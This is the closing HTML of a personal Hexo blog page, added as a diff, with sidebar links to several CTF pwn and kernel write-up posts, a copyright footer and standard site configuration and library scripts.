+<div class="breadcrumb">
+<a href="/categories/kernel/" title="In kernel">kernel</a>
+</div>
+
+    <span><a href="/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/" title="强网杯2018_core">强网杯2018_core</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/03/21/roarctf-2019-easypwn/" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/09/20/tctf2022ezvm/" title="tctf2022ezvm">tctf2022ezvm</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/03/19/pwnable-seethefile/" title="pwnable_seethefile">pwnable_seethefile</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="Symbols count total">282k words</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="Reading time total">4:16</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/05/10/torghast/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)dreamcat?"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
